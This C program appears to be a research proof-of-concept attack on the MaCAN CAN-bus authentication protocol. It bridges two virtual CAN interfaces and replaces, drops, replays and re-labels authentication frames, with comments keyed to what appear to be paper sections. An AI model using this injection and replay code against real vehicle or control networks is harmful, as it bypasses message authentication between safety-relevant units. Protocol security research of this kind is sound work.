#include <ev.h>
#include "helper.h"
#include <stdlib.h>
#include <linux/can.h>
#include <unistd.h>
#include <stdio.h>
#include <macan_private.h>
#include <macan.h>

int sock_i, sock_j;
struct macan_ctx *ctx;

/* macan_config is only needed here for decoding the frames for printing. */
extern struct macan_config config;

struct can_frame remember_ch_i;

int attack = 1;

static void can_rx_cb (struct ev_loop *loop, ev_io *w, int revents)
{
	(void)loop; (void)revents;
	struct can_frame cf;

	while (read(w->fd, &cf, sizeof(cf)) == sizeof(cf)) {
		print_frame(ctx, &cf, " ");

		if (w->fd == sock_i) {
			if (attack && cf.can_id == 0x102 && cf.data[0] == 0x40 && cf.data[1] == 0x03) {
				/* (5.1.2) */
				remember_ch_i = cf;

				/* (5.1.3) */
				struct can_frame m = { .can_id = 0x103, .can_dlc = 8, .data = {0x40, 0x02, 0, 0, 0, 0, 0, 0} };
				print_frame(ctx, &m, "### REPLACED WITH");
				write(sock_j, &m, sizeof(m));
				continue;
			}
			write(sock_j, &cf, sizeof(cf));
			if (attack && cf.can_id == 0x102 && cf.data[0] == 0x83) {
				/* (5.1.12) */
				struct can_frame m = cf;
				m.can_id = 0x103;
				//m.data[0] = 0x82;
				print_frame(ctx, &m, "### REPLAY AS j");
				write(sock_j, &m, sizeof(m));
				continue;
			}

		} else if (w->fd == sock_j) {
			if (attack && cf.can_id == 0x100 && cf.data[0] == 0x02 && cf.data[1] == 0x03) {
				/* (5.1.6) */
				printf("### REMOVED\n");
				/* (5.1.7) */
				print_frame(ctx, &remember_ch_i, "### REPLAYED");
				write(sock_j, &remember_ch_i, sizeof(cf));
				continue;
			}

			write(sock_i, &cf, sizeof(cf));
		}
	}
}

int main(int argc, char *argv[])
{
	(void)argc; (void)argv;
	struct ev_loop *loop = EV_DEFAULT;
	struct macan_node_config nc = {
		.node_id = 0xff, /* Invalid ID */
	};


	ctx = macan_alloc_mem(&config, &nc);

	ev_io can_i, can_j;
	ev_io_init (&can_i, can_rx_cb, sock_i = helper_init("vcani"), EV_READ);
	ev_io_init (&can_j, can_rx_cb, sock_j = helper_init("vcanj"), EV_READ);
	ev_io_start (loop, &can_i);
	ev_io_start (loop, &can_j);

	ev_run(loop, 0);

	return 0;
}
